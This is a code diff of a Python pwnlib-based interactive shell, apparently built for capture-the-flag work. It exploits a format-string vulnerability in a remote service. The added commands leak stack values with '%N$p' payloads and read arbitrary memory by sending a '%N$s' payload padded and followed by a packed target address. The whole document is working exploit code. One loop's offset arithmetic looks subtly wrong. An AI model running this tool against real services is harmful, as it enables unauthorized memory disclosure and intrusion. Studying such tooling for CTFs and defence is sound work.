@@ -1,8 +1,6 @@
 import shell
-
-saved_input = __builtins__.input
 import pwnlib
-print("hi", input, saved_input)
+import re
 
 from shell import Command
 
@@ -16,23 +14,34 @@ class PrintfShell(shell.Shell):
         self.write = write
         self.conn = conn
         self.marker = marker
+        self.stack_offset = None
+
+    @Command
+    def raw(self, *args):
+        print(args)
+        text = b" ".join(bytes(arg, "ascii") for arg in args)
+        self.conn.send(text+b"\n")
+        result = self.conn.recv()
+        print(result)
+        return result
+
+    @Command
+    def set_offset(self, n : int):
+        self.stack_offset = int(n)
 
     @Command
     def connect(self, address, port):
         port = int(port)
-        self.conn = pwnlib.remote(address, port)
+        self.conn = pwnlib.tubes.remote.remote(address, port)
         self.conn.recvuntil(self.marker)
         print(self.conn)
     
-    def read_response(self, string):
+    def read_response(self, string, marker=None):
+        if marker is None:
+            marker = self.marker
         string = self.write(string)
         self.conn.send(string)
         resp = self.conn.recvuntil(self.marker)
-        if self.conn.can_recv():
-            print(resp)
-            print("unexpectedly more:")
-            resp += self.conn.recv()
-            print(resp)
         return self.read(resp[:-len(self.marker)])
     
     @Command
@@ -45,26 +54,30 @@ class PrintfShell(shell.Shell):
             value = self.read_response(bytes(f"%{i}$p", 'ascii'))
             stack.append(value)
         print(stack)
-        for value in stack:
+        for index, value in enumerate(stack):
             if value == b"(nil)":
                 value = b"0x0"
             _, value = value.strip().split(b"0x")
             bs = int(value, 16).to_bytes(8, byteorder="little")
-            print(f"{str(value, 'ascii'):<16} {repr(bs)}")
+            print(f"{index+1:<4} {str(value, 'ascii'):<16} {repr(bs)}")
         return stack
     
     @Command
     def read_bytes(self, addr : int, n : int):
+        if self.stack_offset is None:
+            print("need to set the stack offset `set_offset`")
+            return
         n = int(n)
         addr = int(addr,16)
-        buffer = b"XXXXXX"
+        command = bytes(f"%{self.stack_offset+1}$s", "ascii")
+        padn = (8 - len(command) % 8) % 8
+        pad = b"X"*padn
         all_bytes = b""
         offset = 0
         while len(all_bytes) < n:
-            res = self.read_response(b"%s" + buffer + pwnlib.util.packing.p64(addr + offset))
-            print("Res before buffer", res)
-            res = res[:-len(buffer)]
-            print("res after buffer:", res)
+            suffix = pad + pwnlib.util.packing.p64(addr + offset)
+            res = self.read_response(command + suffix)
+            res = res[:-len(suffix)]
             res = res + b"\x00"
             all_bytes += res
             offset += len(all_bytes)
